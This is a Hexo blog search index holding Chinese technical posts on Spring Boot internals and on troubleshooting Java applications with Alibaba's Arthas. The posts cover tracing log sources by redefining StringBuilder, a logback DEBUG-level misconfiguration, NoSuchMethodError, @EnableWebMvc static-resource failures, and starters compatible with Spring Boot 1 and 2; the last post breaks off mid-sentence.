<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[深入Spring Boot系列]]></title>
    <url>%2Fspring-boot-inside%2F</url>
    <content type="text"><![CDATA[原理/使用 spring boot应用启动原理分析 spring boot executable jar/war 原理 深入Spring Boot：ClassLoader的继承关系和影响 深入Spring Boot：Spring Context的继承关系和影响 深入Spring Boot：实现对Fat Jar jsp的支持 深入Spring Boot：快速集成Dubbo + Hystrix 正确实现用spring扫描自定义的annotation 深入Spring Boot：编写兼容Spring Boot1和Spring Boot2的Starter 排查问题 深入JVM分析spring-boot应用hibernate-validator NoClassDefFoundError 深入Spring Boot：那些注入不了的Spring占位符（${}表达式） 深入Spring Boot：怎样排查 java.lang.ArrayStoreException 深入Spring Boot：排查 Cannot determine embedded database driver class for database type NONE 深入Spring Boot：排查expected single matching bean but found 2的异常 深入Spring Boot：排查@Transactional引起的NullPointerException 深入Spring Boot：显式配置 @EnableWebMvc 导致静态资源访问失败 深入Spring Boot：利用Arthas排查NoSuchMethodError]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>spring</tag>
        <tag>spring-boot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Arthas实践--使用redefine排查应用奇怪的日志来源]]></title>
    <url>%2Farthas-redefine-case%2F</url>
    <content type="text"><![CDATA[背景随着应用越来越复杂，依赖越来越多，日志系统越来越混乱，有时会出现一些奇怪的日志，比如： 1[] [] [] No credential found 那么怎样排查这些奇怪的日志从哪里打印出来的呢？因为搞不清楚是什么logger打印出来的，所以想定位就比较头疼。 下面介绍用Alibaba开源的应用诊断利器Arthas的redefine命令快速定位奇怪日志来源。 Arthas: https://github.com/alibaba/arthas redefine命令：https://alibaba.github.io/arthas/redefine.html 修改StringBuilder首先在java代码里，字符串拼接基本都是通过StringBuilder来实现的。比如下面的代码： 123public static String hello(String world) &#123; return "hello " + world;&#125; 实际上生成的字节码也是用StringBuilder来拼接的： 12345678910111213public static java.lang.String hello(java.lang.String); descriptor: (Ljava/lang/String;)Ljava/lang/String; flags: ACC_PUBLIC, ACC_STATIC Code: stack=3, locals=1, args_size=1 0: new #22 // class java/lang/StringBuilder 3: dup 4: ldc #24 // String hello 6: invokespecial #26 // Method java/lang/StringBuilder."&lt;init&gt;":(Ljava/lang/String;)V 9: aload_0 10: invokevirtual #29 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder; 13: invokevirtual #33 // Method java/lang/StringBuilder.toString:()Ljava/lang/String; 16: areturn 在java的logger系统里，输出日志时通常也是StringBuilder来实现的，最终会调用StringBuilder.toString()，那么我们可以修改StringBuilder的代码来检测到日志来源。 StringBuilder.toString() 的原生实现是： 12345@Overridepublic String toString() &#123; // Create a copy, don't share the array return new String(value, 0, count);&#125; 修改为： 12345678910@Overridepublic String toString() &#123; // Create a copy, don't share the array String result = new String(value, 0, count); if(result.contains("No credential found")) &#123; System.err.println(result); new Throwable().printStackTrace(); &#125; return result;&#125; 增加的逻辑是：当String里包含No credential found时打印出当前栈，这样子就可以定位日志输出来源了。 编绎修改过的StringBuilder其实很简单，在IDE里把StringBuilder的代码复制一份，然后贴到任意一个工程里，然后编绎即可。 也可以直接用javac来编绎： 1javac StringBuilder.java 启动应用，使用Arthas redefine修改过的StringBuilder启动应用后，在奇怪日志输出之前，先使用arthas attach应用，再redefine StringBuilder: 12$ redefine -p /tmp/StringBuilder.classredefine success, size: 1 当执行到输出[] [] [] No credential found的logger代码时，会打印当前栈。实际运行结果是： 123456789101112[] [] [] No credential foundjava.lang.Throwable at java.lang.StringBuilder.toString(StringBuilder.java:410) at com.taobao.middleware.logger.util.MessageUtil.getMessage(MessageUtil.java:26) at com.taobao.middleware.logger.util.MessageUtil.getMessage(MessageUtil.java:15) at com.taobao.middleware.logger.slf4j.Slf4jLogger.info(Slf4jLogger.java:77) at com.taobao.spas.sdk.common.log.SpasLogger.info(SpasLogger.java:18) at com.taobao.spas.sdk.client.identity.CredentialWatcher.loadCredential(CredentialWatcher.java:128) at com.taobao.spas.sdk.client.identity.CredentialWatcher.access$200(CredentialWatcher.java:18) at com.taobao.spas.sdk.client.identity.CredentialWatcher$1.run(CredentialWatcher.java:58) at java.util.TimerThread.mainLoop(Timer.java:555) at java.util.TimerThread.run(Timer.java:505) 可以看到是spas.sdk打印出了[] [] [] No credential found的日志。 总结 logger最终会用StringBuilder来输出 修改StringBuilder来定位输出特定日志的地方 使用Arthas redefine命令来加载修改过的StringBuilder redefine命令实际上实现了任意代码线上debug的功能，可以随意本地修改代码重新编绎，然后线上redefine加载 redefine的功能过于强大，所以请小心使用:) Arthas实践系列 使用Arthas抽丝剥茧排查线上应用日志打满问题 深入Spring Boot：利用Arthas排查NoSuchMethodError]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>logger</tag>
        <tag>arthas</tag>
        <tag>redefine</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Arthas实践--抽丝剥茧排查线上应用日志打满问题]]></title>
    <url>%2Farthas-logger-problem%2F</url>
    <content type="text"><![CDATA[现象在应用的 service_stdout.log里一直输出下面的日志，直接把磁盘打满了： 123423:07:34.441 [TAIRCLIENT-1-thread-1] DEBUG io.netty.channel.nio.NioEventLoop - Selector.select() returned prematurely 14 times in a row.23:07:34.460 [TAIRCLIENT-1-thread-3] DEBUG io.netty.channel.nio.NioEventLoop - Selector.select() returned prematurely 3 times in a row.23:07:34.461 [TAIRCLIENT-1-thread-4] DEBUG io.netty.channel.nio.NioEventLoop - Selector.select() returned prematurely 3 times in a row.23:07:34.462 [TAIRCLIENT-1-thread-5] DEBUG io.netty.channel.nio.NioEventLoop - Selector.select() returned prematurely 3 times in a row. service_stdout.log是进程标准输出的重定向，可以初步判定是tair插件把日志输出到了stdout里。 尽管有了初步的判断，但是具体logger为什么会打到stdout里，还需要进一步排查，常见的方法可能是本地debug。 下面介绍利用arthas直接在线上定位问题的过程，主要使用sc和getstatic命令。 https://alibaba.github.io/arthas/sc.html https://alibaba.github.io/arthas/getstatic.html 定位logger的具体实现日志是io.netty.channel.nio.NioEventLoop输出的，到netty的代码里查看，发现是DEBUG级别的输出： https://github.com/netty/netty/blob/netty-4.0.35.Final/transport/src/main/java/io/netty/channel/nio/NioEventLoop.java#L673 然后用arthas的sc命令来查看具体的io.netty.channel.nio.NioEventLoop是从哪里加载的。 123456789101112131415161718192021222324class-info io.netty.channel.nio.NioEventLoop code-source file:/opt/app/plugins/tair-plugin/lib/netty-all-4.0.35.Final.jar!/ name io.netty.channel.nio.NioEventLoop isInterface false isAnnotation false isEnum false isAnonymousClass false isArray false isLocalClass false isMemberClass false isPrimitive false isSynthetic false simple-name NioEventLoop modifier final,public annotation interfaces super-class +-io.netty.channel.SingleThreadEventLoop +-io.netty.util.concurrent.SingleThreadEventExecutor +-io.netty.util.concurrent.AbstractScheduledEventExecutor +-io.netty.util.concurrent.AbstractEventExecutor +-java.util.concurrent.AbstractExecutorService +-java.lang.Object class-loader +-tair-plugin's ModuleClassLoader classLoaderHash 73ad2d6 可见，的确是从tair插件里加载的。 查看NioEventLoop的代码，可以发现它有一个logger的field： 123public final class NioEventLoop extends SingleThreadEventLoop &#123; private static final InternalLogger logger = InternalLoggerFactory.getInstance(NioEventLoop.class); 使用arthas的getstatic命令来查看这个logger具体实现类是什么（使用-c参数指定classloader）： 123$ getstatic -c 73ad2d6 io.netty.channel.nio.NioEventLoop logger &apos;getClass().getName()&apos;field: logger@String[io.netty.util.internal.logging.Slf4JLogger] 可以发现是Slf4JLogger。 再查看io.netty.util.internal.logging.Slf4JLogger的实现，发现它内部有一个logger的field： 1234567891011package io.netty.util.internal.logging;import org.slf4j.Logger;/** * &lt;a href="http://www.slf4j.org/"&gt;SLF4J&lt;/a&gt; logger. */class Slf4JLogger extends AbstractInternalLogger &#123; private static final long serialVersionUID = 108038972685130825L; private final transient Logger logger; 那么使用arthas的getstatic命令来查看这个logger属性的值： 1234567891011121314$ getstatic -c 73ad2d6 io.netty.channel.nio.NioEventLoop logger 'logger'field: logger@Logger[ serialVersionUID=@Long[5454405123156820674], FQCN=@String[ch.qos.logback.classic.Logger], name=@String[io.netty.channel.nio.NioEventLoop], level=null, effectiveLevelInt=@Integer[10000], parent=@Logger[Logger[io.netty.channel.nio]], childrenList=null, aai=null, additive=@Boolean[true], loggerContext=@LoggerContext[ch.qos.logback.classic.LoggerContext[default]],] 可见，logger的最本质实现类是：ch.qos.logback.classic.Logger。 再次用getstatic命令来确定jar包的location： 123456789101112131415161718192021222324$ getstatic -c 73ad2d6 io.netty.channel.nio.NioEventLoop logger 'logger.getClass().getProtectionDomain().getCodeSource().getLocation()'field: logger@URL[ BUILTIN_HANDLERS_PREFIX=@String[sun.net.www.protocol], serialVersionUID=@Long[-7627629688361524110], protocolPathProp=@String[java.protocol.handler.pkgs], protocol=@String[jar], host=@String[], port=@Integer[-1], file=@String[file:/opt/app/plugins/tair-plugin/lib/logback-classic-1.2.3.jar!/], query=null, authority=@String[], path=@String[file:/opt/app/plugins/tair-plugin/lib/logback-classic-1.2.3.jar!/], userInfo=null, ref=null, hostAddress=null, handler=@Handler[com.taobao.pandora.loader.jar.Handler@1a0c361e], hashCode=@Integer[126346621], tempState=null, factory=@TomcatURLStreamHandlerFactory[org.apache.catalina.webresources.TomcatURLStreamHandlerFactory@3edd7b7], handlers=@Hashtable[isEmpty=false;size=4], streamHandlerLock=@Object[java.lang.Object@488ccac9], serialPersistentFields=@ObjectStreamField[][isEmpty=false;size=7],] 可见这个ch.qos.logback.classic.Logger的确是tair插件里加载的。 定位logger的level上面已经定位logger的实现类是ch.qos.logback.classic.Logger，但是为什么它会输出DEBUG level的日志？ 其实在上面的getstatic -c 73ad2d6 io.netty.channel.nio.NioEventLoop logger &#39;logger&#39;输出里，已经打印出它的level是null了。如果对logger有所了解的话，可以知道当child logger的level为null时，它的level取决于parent logger的level。 我们再来看下ch.qos.logback.classic.Logger的代码，它有一个parent logger的属性： 1234567public final class Logger implements org.slf4j.Logger, LocationAwareLogger, AppenderAttachable&lt;ILoggingEvent&gt;, Serializable &#123; /** * The parent of this category. All categories have at least one ancestor * which is the root category. */ transient private Logger parent; 所以，我们可以通过getstatic来获取到这个parent属性的内容。然后通过多个parent操作，可以发现level都是null，最终发现ROOT level是DEBUG 。 1234567891011121314$ getstatic -c 73ad2d6 io.netty.channel.nio.NioEventLoop logger 'logger.parent.parent.parent.parent.parent'field: logger@Logger[ serialVersionUID=@Long[5454405123156820674], FQCN=@String[ch.qos.logback.classic.Logger], name=@String[ROOT], level=@Level[DEBUG], effectiveLevelInt=@Integer[10000], parent=null, childrenList=@CopyOnWriteArrayList[isEmpty=false;size=2], aai=@AppenderAttachableImpl[ch.qos.logback.core.spi.AppenderAttachableImpl@1ecf9bae], additive=@Boolean[true], loggerContext=@LoggerContext[ch.qos.logback.classic.LoggerContext[default]],] 所以 io.netty.channel.nio.NioEventLoop的logger的level取的是ROOT logger的配置，即默认值DEBUG。 具体实现可以查看ch.qos.logback.classic.LoggerContext 123456789101112public LoggerContext() &#123; super(); this.loggerCache = new ConcurrentHashMap&lt;String, Logger&gt;(); this.loggerContextRemoteView = new LoggerContextVO(this); this.root = new Logger(Logger.ROOT_LOGGER_NAME, null, this); this.root.setLevel(Level.DEBUG); loggerCache.put(Logger.ROOT_LOGGER_NAME, root); initEvaluatorMap(); size = 1; this.frameworkPackages = new ArrayList&lt;String&gt;();&#125; 为什么logback输出到了stdout里上面我们得到结论 tair插件里的logback默认的level是DEBUG，导致netty里的日志可以被打印出来 那么我们可以猜测： tair里的logback没有特殊配置，或者只配置了tair自己的package，导致ROOT logger的日志直接输出到stdout里 那么实现上tair里是使用了logger-api，它通过LoggerFactory.getLogger函数获取到了自己package的logger，然后设置level为INFO，并设置了appender。 换而言之，tair插件里的logback没有设置ROOT logger，所以它的默认level是DEBUG，并且默认的appender会输出到stdout里。 所以tair插件可以增加设置ROOT logger level为INFO来修复这个问题。 12345678910111213141516171819202122232425262728private static com.taobao.middleware.logger.Logger logger = com.taobao.middleware.logger.LoggerFactory.getLogger("com.taobao.tair"); public static com.taobao.middleware.logger.Logger infolog = com.taobao.middleware.logger.LoggerFactory.getLogger("com.taobao.tair.custom-infolog"); public static int JM_LOG_RETAIN_COUNT = 3; public static String JM_LOG_FILE_SIZE = "200MB"; static &#123; try &#123; String tmp = System.getProperty("JM.LOG.RETAIN.COUNT", "3"); JM_LOG_RETAIN_COUNT = Integer.parseInt(tmp); &#125; catch (NumberFormatException e) &#123; &#125; JM_LOG_FILE_SIZE = System.getProperty("JM.LOG.FILE.SIZE", "200MB"); logger.setLevel(Level.INFO); logger.activateAppenderWithSizeRolling("tair-client", "tair-client.log", "UTF-8", TairUtil.splitSize(JM_LOG_FILE_SIZE, 0.8 / (JM_LOG_RETAIN_COUNT + 1)), JM_LOG_RETAIN_COUNT); logger.setAdditivity(false); logger.activateAsync(500, 100); logger.info("JM_LOG_RETAIN_COUNT " + JM_LOG_RETAIN_COUNT + " JM_LOG_FILE_SIZE " + JM_LOG_FILE_SIZE); infolog.setLevel(Level.INFO); infolog.activateAppenderWithSizeRolling("tair-client", "tair-client-info.log", "UTF-8", "10MB", 1); infolog.setAdditivity(false); infolog.activateAsync(500, 100); 总结 tair插件里直接以api的方式设置了自己package下的logger tair插件里netty的logger的packge和tair并不一样，所以它最终取的是ROOT logger的配置 logback默认的ROOT logger level是DEBUG，输出是stdout 利用arthas的sc命令定位具体的类 利用arthas的getstatic获取static filed的值 利用logger parent层联的特性，可以向上一层层获取到ROOT logger的配置 链接 Arthas开源：https://github.com/alibaba/arthas]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>logger</tag>
        <tag>classloader</tag>
        <tag>arthas</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入Spring Boot：利用Arthas排查NoSuchMethodError]]></title>
    <url>%2Fspring-boot-arthas-NoSuchMethodError%2F</url>
    <content type="text"><![CDATA[前言有时spring boot应用会遇到java.lang.NoSuchMethodError的问题，下面以具体的demo来说明怎样利用arthas来排查。 Demo: https://github.com/hengyunabc/spring-boot-inside/tree/master/demo-NoSuchMethodError 在应用的main函数里catch住异常，保证进程不退出很多时候当应用抛出异常后，进程退出了，就比较难排查问题。可以先改下main函数，把异常catch住： 123456789public static void main(String[] args) throws IOException &#123; try &#123; SpringApplication.run(DemoNoSuchMethodErrorApplication.class, args); &#125; catch (Throwable e) &#123; e.printStackTrace(); &#125; // block System.in.read();&#125; Demo启动之后，抛出的异常是： 12345678java.lang.NoSuchMethodError: org.springframework.core.annotation.AnnotationAwareOrderComparator.sort(Ljava/util/List;)V at org.springframework.boot.SpringApplication.getSpringFactoriesInstances(SpringApplication.java:394) at org.springframework.boot.SpringApplication.getSpringFactoriesInstances(SpringApplication.java:383) at org.springframework.boot.SpringApplication.initialize(SpringApplication.java:249) at org.springframework.boot.SpringApplication.&lt;init&gt;(SpringApplication.java:225) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1118) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1107) at com.example.demoNoSuchMethodError.DemoNoSuchMethodErrorApplication.main(DemoNoSuchMethodErrorApplication.java:13) 显然，异常的意思是AnnotationAwareOrderComparator缺少sort(Ljava/util/List;)V这个函数。 安装arthas参考：https://alibaba.github.io/arthas/install-detail.html 使用sc命令查找类所在的jar包应用需要抛出了异常，但是进程还没有退出，我们用arthas来attach上去。比如在mac下面： 1./as.sh 然后选择com.example.demoNoSuchMethodError.DemoNoSuchMethodErrorApplication进程。 再执行sc命令来查找类： 123456789101112131415161718192021222324$ sc -d org.springframework.core.annotation.AnnotationAwareOrderComparator class-info org.springframework.core.annotation.AnnotationAwareOrderComparator code-source /Users/hengyunabc/.m2/repository/org/springframework/spring/2.5.6.SEC03/spring-2.5.6.SEC03.jar name org.springframework.core.annotation.AnnotationAwareOrderComparator isInterface false isAnnotation false isEnum false isAnonymousClass false isArray false isLocalClass false isMemberClass false isPrimitive false isSynthetic false simple-name AnnotationAwareOrderComparator modifier public annotation interfaces super-class +-org.springframework.core.OrderComparator +-java.lang.Object class-loader +-sun.misc.Launcher$AppClassLoader@5c647e05 +-sun.misc.Launcher$ExtClassLoader@689e3d07 classLoaderHash 5c647e05Affect(row-cnt:1) cost in 41 ms. 可以看到AnnotationAwareOrderComparator是从spring-2.5.6.SEC03.jar里加载的。 使用jad查看反编绎的源代码下面使用jad命令来查看AnnotationAwareOrderComparator的源代码 12345678910111213141516171819202122232425262728293031323334$ jad org.springframework.core.annotation.AnnotationAwareOrderComparatorClassLoader:+-sun.misc.Launcher$AppClassLoader@5c647e05 +-sun.misc.Launcher$ExtClassLoader@689e3d07Location:/Users/hengyunabc/.m2/repository/org/springframework/spring/2.5.6.SEC03/spring-2.5.6.SEC03.jar/* * Decompiled with CFR 0_132. */package org.springframework.core.annotation;import java.lang.annotation.Annotation;import org.springframework.core.OrderComparator;import org.springframework.core.Ordered;import org.springframework.core.annotation.Order;public class AnnotationAwareOrderComparatorextends OrderComparator &#123; protected int getOrder(Object obj) &#123; Order order; if (obj instanceof Ordered) &#123; return ((Ordered)obj).getOrder(); &#125; if (obj != null &amp;&amp; (order = obj.getClass().getAnnotation(Order.class)) != null) &#123; return order.value(); &#125; return Integer.MAX_VALUE; &#125;&#125;Affect(row-cnt:1) cost in 286 ms. 可见，AnnotationAwareOrderComparator的确没有sort(Ljava/util/List;)V函数。 排掉依赖，解决问题从上面的排查里，可以确定 AnnotationAwareOrderComparator来自spring-2.5.6.SEC03.jar，的确没有sort(Ljava/util/List;)V函数。 所以，可以检查maven依赖，把spring 2的jar包排掉，这样子就可以解决问题了。 总结 仔细看NoSuchMethodError的异常信息，了解是什么类缺少了什么函数 利用arthas来查找类，反编绎源码，确认问题 链接 Arthas–Alibaba开源Java诊断利器]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>arthas</tag>
        <tag>spring</tag>
        <tag>spring-boot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入Spring Boot：显式配置 @EnableWebMvc 导致静态资源访问失败]]></title>
    <url>%2Fspring-boot-enablewebmvc-static-404%2F</url>
    <content type="text"><![CDATA[现象当用户在自己的spring boot main class上面显式使用了@EnableWebMvc，发现原来的放在 src/main/resources/static 目录下面的静态资源访问不到了。 1234567@SpringBootApplication@EnableWebMvcpublic class DemoApplication &#123; public static void main(String[] args) &#123; SpringApplication.run(DemoApplication.class, args); &#125;&#125; 比如在用户代码目录src/main/resources里有一个hello.txt的资源。访问 http://localhost:8080/hello.txt 返回的结果是404： 1234567Whitelabel Error PageThis application has no explicit mapping for /error, so you are seeing this as a fallback.Thu Jun 01 11:39:41 CST 2017There was an unexpected error (type=Not Found, status=404).No message available 静态资源访问失败原因@EnableWebMvc的实现那么为什么用户显式配置了@EnableWebMvc，spring boot访问静态资源会失败？ 我们先来看下@EnableWebMvc的实现： 123@Import(DelegatingWebMvcConfiguration.class)public @interface EnableWebMvc &#123;&#125; 1234567891011/** * A subclass of &#123;@code WebMvcConfigurationSupport&#125; that detects and delegates * to all beans of type &#123;@link WebMvcConfigurer&#125; allowing them to customize the * configuration provided by &#123;@code WebMvcConfigurationSupport&#125;. This is the * class actually imported by &#123;@link EnableWebMvc @EnableWebMvc&#125;. * * @author Rossen Stoyanchev * @since 3.1 */@Configurationpublic class DelegatingWebMvcConfiguration extends WebMvcConfigurationSupport &#123; 可以看到@EnableWebMvc 引入了 WebMvcConfigurationSupport，是spring mvc 3.1里引入的一个自动初始化配置的@Configuration 类。 spring boot里的静态资源访问的实现再来看下spring boot里是怎么实现对src/main/resources/static这些目录的支持。 主要是通过org.springframework.boot.autoconfigure.web.WebMvcAutoConfiguration来实现的。 123456789@Configuration@ConditionalOnWebApplication@ConditionalOnClass(&#123; Servlet.class, DispatcherServlet.class, WebMvcConfigurerAdapter.class &#125;)@ConditionalOnMissingBean(WebMvcConfigurationSupport.class)@AutoConfigureOrder(Ordered.HIGHEST_PRECEDENCE + 10)@AutoConfigureAfter(&#123; DispatcherServletAutoConfiguration.class, ValidationAutoConfiguration.class &#125;)public class WebMvcAutoConfiguration &#123; 可以看到 @ConditionalOnMissingBean(WebMvcConfigurationSupport.class) ，这个条件导致spring boot的WebMvcAutoConfiguration不生效。 总结下具体的原因： 用户配置了@EnableWebMvc Spring扫描所有的注解，再从注解上扫描到@Import，把这些@Import引入的bean信息都缓存起来 在扫描到@EnableWebMvc时，通过@Import加入了 DelegatingWebMvcConfiguration，也就是WebMvcConfigurationSupport spring再处理@Conditional相关的注解，判断发现已有WebMvcConfigurationSupport，就跳过了spring bootr的WebMvcAutoConfiguration 所以spring boot自己的静态资源配置不生效。 其实在spring boot的文档里也有提到这点： http://docs.spring.io/spring-boot/docs/current/reference/htmlsingle/#boot-features-spring-mvc-auto-configuration If you want to keep Spring Boot MVC features, and you just want to add additional MVC configuration (interceptors, formatters, view controllers etc.) you can add your own @Configuration class of type WebMvcConfigurerAdapter, but without @EnableWebMvc. If you wish to provide custom instances of RequestMappingHandlerMapping, RequestMappingHandlerAdapter or ExceptionHandlerExceptionResolver you can declare a WebMvcRegistrationsAdapter instance providing such components. Spring Boot ResourceProperties的配置在spring boot里静态资源目录的配置是在ResourceProperties里。 12345678910111213141516171819@ConfigurationProperties(prefix = "spring.resources", ignoreUnknownFields = false)public class ResourceProperties implements ResourceLoaderAware &#123; private static final String[] SERVLET_RESOURCE_LOCATIONS = &#123; "/" &#125;; private static final String[] CLASSPATH_RESOURCE_LOCATIONS = &#123; "classpath:/META-INF/resources/", "classpath:/resources/", "classpath:/static/", "classpath:/public/" &#125;; private static final String[] RESOURCE_LOCATIONS; static &#123; RESOURCE_LOCATIONS = new String[CLASSPATH_RESOURCE_LOCATIONS.length + SERVLET_RESOURCE_LOCATIONS.length]; System.arraycopy(SERVLET_RESOURCE_LOCATIONS, 0, RESOURCE_LOCATIONS, 0, SERVLET_RESOURCE_LOCATIONS.length); System.arraycopy(CLASSPATH_RESOURCE_LOCATIONS, 0, RESOURCE_LOCATIONS, SERVLET_RESOURCE_LOCATIONS.length, CLASSPATH_RESOURCE_LOCATIONS.length); &#125; 然后在 WebMvcAutoConfigurationAdapter里会初始始化相关的ResourceHandler。 12345678910111213141516171819202122232425262728293031323334//org.springframework.boot.autoconfigure.web.WebMvcAutoConfiguration.WebMvcAutoConfigurationAdapter@Configuration@Import(&#123; EnableWebMvcConfiguration.class, MvcValidatorRegistrar.class &#125;)@EnableConfigurationProperties(&#123; WebMvcProperties.class, ResourceProperties.class &#125;)public static class WebMvcAutoConfigurationAdapter extends WebMvcConfigurerAdapter &#123; private static final Log logger = LogFactory .getLog(WebMvcConfigurerAdapter.class); private final ResourceProperties resourceProperties; @Override public void addResourceHandlers(ResourceHandlerRegistry registry) &#123; if (!this.resourceProperties.isAddMappings()) &#123; logger.debug("Default resource handling disabled"); return; &#125; Integer cachePeriod = this.resourceProperties.getCachePeriod(); if (!registry.hasMappingForPattern("/webjars/**")) &#123; customizeResourceHandlerRegistration( registry.addResourceHandler("/webjars/**") .addResourceLocations( "classpath:/META-INF/resources/webjars/") .setCachePeriod(cachePeriod)); &#125; String staticPathPattern = this.mvcProperties.getStaticPathPattern(); if (!registry.hasMappingForPattern(staticPathPattern)) &#123; customizeResourceHandlerRegistration( registry.addResourceHandler(staticPathPattern) .addResourceLocations( this.resourceProperties.getStaticLocations()) .setCachePeriod(cachePeriod)); &#125; &#125; 用户可以自己修改这个默认的静态资源目录，但是不建议，因为很容易引出奇怪的404问题。]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>spring</tag>
        <tag>spring-boot</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入Spring Boot：编写兼容Spring Boot1和Spring Boot2的Starter]]></title>
    <url>%2Fspring-boot-starter-compatibility%2F</url>
    <content type="text"><![CDATA[前言Spring Boot 2正式发布已经有段时间，应用升级之前，starter先要升级，那么如何支持Spring Boot 2？ 为什么选择starter同时兼容spring boot 1和spring boot 2 从用户角度来看 如果不在一个starter里兼容，比如用版本号来区分，spring boot 1的用户使用1.*，spring boot 2用户使用2.*，这样用户升级会有很大困扰。 另外，我们的starter是以日期为版本号的，如果再分化，则就会出现2018-06-stable-boot1，2018-06-stable-boot2，这样子很丑陋。 从开发者角度来看 要同时维护两个分支，修改代码时要合到两个分支上，发版本时要同时两个。如果有统一的bom文件，也需要维护两份。工作量翻倍，而且很容易出错。 因此，我们决定在同一个代码分支里，同时支持spring boot 1/2。减少开发维护成本，减少用户使用困扰。 编写兼容的starter的难点spring boot starter的代码入口都是在各种@Configuration类里，这为我们编写兼容starter提供了条件。 但还是有一些难点： 某些类不兼容，比如在spring boot 2里删除掉了 代码模块，maven依赖怎样组织 怎样保证starter在spring boot 1/2里都能正常工作 通过ASM分析现有的starter里不兼容的类 https://github.com/hengyunabc/springboot-classchecker springboot-classchecker可以从jar包里扫描出哪些类在spring boot 2里不存在的。 工作原理：springboot-classchecker自身在pom.xml里依赖的是spring boot 2，扫描jar包里通过ASM分析到所有的String，提取出类名之后，再尝试在ClassLoader里加载，如果加载不到，则说明这个类在spring boot 2里不存在。 例如扫描demo-springboot1-starter.jar ： 12mvn clean packagejava -jar target/classchecker-0.0.1-SNAPSHOT.jar demo-springboot1-starter.jar 结果是： 1234path: demo-springboot1-starter.jarorg.springframework.boot.actuate.autoconfigure.ConditionalOnEnabledHealthIndicatororg.springframework.boot.actuate.autoconfigure.EndpointAutoConfigurationorg.springframework.boot.actuate.autoconfigure.HealthIndicatorAutoConfiguration 那么这些类在spring boot 2在哪里了？ 实际上是改了package： 123org.springframework.boot.actuate.autoconfigure.health.ConditionalOnEnabledHealthIndicatororg.springframework.boot.actuate.autoconfigure.endpoint.EndpointAutoConfigurationorg.springframework.boot.actuate.autoconfigure.health.HealthIndicatorAutoConfiguration 通过扫描20多个starter jar包，发现不兼容的类有： org.springframework.boot.env.PropertySourcesLoader org.springframework.boot.autoconfigure.jdbc.DataSourceBuilder org.springframework.boot.bind.RelaxedDataBinder Endpoint/HealthIndicator 相关的类 可以总结： spring boot核心的类，autoconfigure相关的没有改动 大部分修改的是Endpoint/HealthIndicator 相关的类 spring-boot-utils兼容工具类 https://github.com/hengyunabc/spring-boot-utils spring-boot-utils提供兼容工具类，同时支持spring boot 1/2。 BinderUtils在spring boot 1里，注入环境变量有时需要用到RelaxedDataBinder： 123MyProperties myProperties = new MyProperties();MutablePropertySources propertySources = environment.getPropertySources();new RelaxedDataBinder(myProperties, "spring.my").bind(new PropertySourcesPropertyValues(propertySources)); 在spring boot 2里，RelaxedDataBinder删除掉了，新的写法是用Binder： 12Binder binder = Binder.get(environment);MyProperties myProperties = binder.bind("spring.my", MyProperties.class).get(); 通过BinderUtils，则可以同时支持spring boot1/2： 1MyProperties myProperties = BinderUtils.bind(environment, "spring.my", MyProperties.class); @ConditionalOnSpringBoot1/@ConditionalOnSpringBoot2spring boot starter的功能大部分都是通过@Configuration组装起来的。spring boot 1的Configuration类，不能在spring boot 2里启用。则可以通过@ConditionalOnSpringBoot1，@ConditionalOnSpringBoot2这两个注解来分别支持。 其实原理很简单，判断spring boot 1/2里各自有的存在的类就可以了。 123@ConditionalOnClass(name = "org.springframework.boot.bind.RelaxedDataBinder")public @interface ConditionalOnSpringBoot1 &#123;&#125; 123@ConditionalOnClass(name = "org.springframework.boot.context.properties.bind.Binder")public @interface ConditionalOnSpringBoot2 &#123;&#125; Starter代码模块组织下面以实际的一个starter来说明。 https://github.com/hengyunabc/endpoints-spring-boot-starter spring boot web应用的mappings信息，可以在/mappings endpoint查询到。但是这么多endpoint，它们都提供了哪些url？ endpoints-spring-boot-starter的功能是展示所有endpoints的url mappings信息 endpoints-spring-boot-starter里需要给spring boot 1/2同时提供endpoint功能，代码模块如下： 123endpoints-spring-boot-starter|__ endpoints-spring-boot-autoconfigure1|__ endpoints-spring-boot-autoconfigure2 endpoints-spring-boot-autoconfigure1模块在pom.xml里依赖的是spring boot 1相关的jar，并且都设置为&lt;optional&gt;true&lt;/optional&gt; endpoints-spring-boot-autoconfigure2的配置类似 endpoints-spring-boot-starter依赖autoconfigure1 和 autoconfigure2 如果有公共的逻辑，可以增加一个commons模块 Endpoint兼容以 endpoints-spring-boot-autoconfigure1模块为例说明怎样处理。 EndPointsEndPoint类继承自spring boot 1的AbstractMvcEndpoint： 12@ConfigurationProperties("endpoints.endpoints")public class EndPointsEndPoint extends AbstractMvcEndpoint &#123; 通过@ManagementContextConfiguration引入 123456789101112@ManagementContextConfigurationpublic class EndPointsEndPointManagementContextConfiguration &#123; @Bean @ConditionalOnMissingBean @ConditionalOnEnabledEndpoint("endpoints") public EndPointsEndPoint EndPointsEndPoint() &#123; EndPointsEndPoint endPointsEndPoint = new EndPointsEndPoint(); return endPointsEndPoint; &#125;&#125; 在META-INF/resources/spring.factories里配置 12org.springframework.boot.actuate.autoconfigure.ManagementContextConfiguration=\io.github.hengyunabc.endpoints.autoconfigure1.EndPointsEndPointManagementContextConfiguration 因为org.springframework.boot.actuate.autoconfigure.ManagementContextConfiguration是只在spring boot 1里，在spring boot 2的应用里不会加载它，所以autoconfigure1模块天然兼容spring boot 2。 那么类似的，autoconfigure2模块里在META-INF/resources/spring.factories配置的是 12org.springframework.boot.actuate.autoconfigure.web.ManagementContextConfiguration=\io.github.hengyunabc.endpoints.autoconfigure2.ManagementApplicationcontextHolderConfiguration 仔细对比，可以发现是spring boot 